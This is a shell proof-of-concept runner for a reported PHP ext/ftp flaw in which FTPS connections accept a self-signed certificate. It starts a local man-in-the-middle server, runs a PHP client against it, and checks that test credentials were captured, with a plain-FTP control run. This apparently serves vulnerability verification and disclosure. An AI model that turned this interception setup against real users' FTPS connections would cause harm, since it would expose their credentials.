#!/bin/sh
# PoC runner for: FTPS handshake in ext/ftp performs no peer certificate
# verification (CWE-295) - PHP 8.5.12 @ 136e049.
#
# baseline: PHP client (ftp_ssl_connect/ftp_login) -> MITM server presenting
#           a SELF-SIGNED certificate for CN=not-the-real-server.
#           Effect: SSL_connect() succeeds, login succeeds, and the MITM
#           captures the plaintext USER/PASS commands from inside the tunnel.
# control:  same server, same client, but plain ftp_connect() - no SSL is
#           requested at all, so no TLS handshake and no certificate check
#           happens; this is the identical-input run without the ftp_ssl
#           condition. It shows the MITM log has no TLS lines and the
#           client performs no SSL_connect at all.
#
# The PHP binary under $OUT is the one built from the checkout; the control
# reuses it and does not rebuild.
set -eu
HERE="$(cd "$(dirname "$0")" && pwd)"
SRC_DIR="${SRC_DIR:-$HERE/../repo}"
OUT="${OUT:-$HERE/../out}"
OFFLINE="${OFFLINE-}"
MODE="${1:-baseline}"
mkdir -p "$OUT"

PHP="$SRC_DIR/sapi/cli/php"
if [ ! -x "$PHP" ]; then
    echo "PHP binary not built at $PHP" >&2
    exit 1
fi

PORT_FILE="$OUT/port"
# Pick a free port.
python3 - <<'EOF' > "$PORT_FILE"
import socket
s = socket.socket()
s.bind(("127.0.0.1", 0))
print(s.getsockname()[1])
s.close()
EOF
PORT="$(cat "$PORT_FILE")"

echo "artifact: PHP CLI $PHP"
echo "php-sha256 $(sha256sum "$PHP" | cut -d' ' -f1)"
echo "mode=$MODE port=$PORT"

if [ "$MODE" = "baseline" ]; then
    python3 "$HERE/mitm_server.py" "$PORT" "$OUT/mitm_baseline.log" &
    MITM=$!
    sleep 1
    "$PHP" "$HERE/poc.php" baseline "$PORT"
    wait $MITM || true
    echo "---- MITM server log (baseline) ----"
    cat "$OUT/mitm_baseline.log"
    echo "------------------------------------"
    if grep -q "TLS-HANDSHAKE-COMPLETED" "$OUT/mitm_baseline.log" && \
       grep -q "USER ftpuser" "$OUT/mitm_baseline.log" && \
       grep -q "PASS secret-PASSWORD" "$OUT/mitm_baseline.log"; then
        echo "EFFECT-PRESENT: the TLS handshake with a self-signed certificate completed and the MITM captured the credentials"
        exit 0
    fi
    echo "EFFECT-ABSENT: the MITM did not complete a TLS handshake or did not capture credentials"
    exit 1
elif [ "$MODE" = "control" ]; then
    # Same fake server, same client credentials, but the client never asks
    # for SSL: no AUTH TLS is sent, no SSL_connect() runs in ftp_login().
    python3 "$HERE/mitm_server.py" "$PORT" "$OUT/mitm_control.log" &
    MITM=$!
    sleep 1
    "$PHP" "$HERE/poc.php" control "$PORT"
    wait $MITM || true
    echo "---- MITM server log (control) ----"
    cat "$OUT/mitm_control.log"
    echo "------------------------------------"
    if grep -q "TLS-HANDSHAKE-COMPLETED" "$OUT/mitm_control.log"; then
        echo "CONTROL-FAILED: a TLS handshake happened even without ftp_ssl_connect()"
        exit 1
    fi
    echo "CONTROL-OK: no TLS handshake, no self-signed certificate accepted, no TLS credentials captured; the ssl_connect sink was not reached"
    exit 0
else
    echo "usage: $0 [baseline|control]" >&2
    exit 2
fi
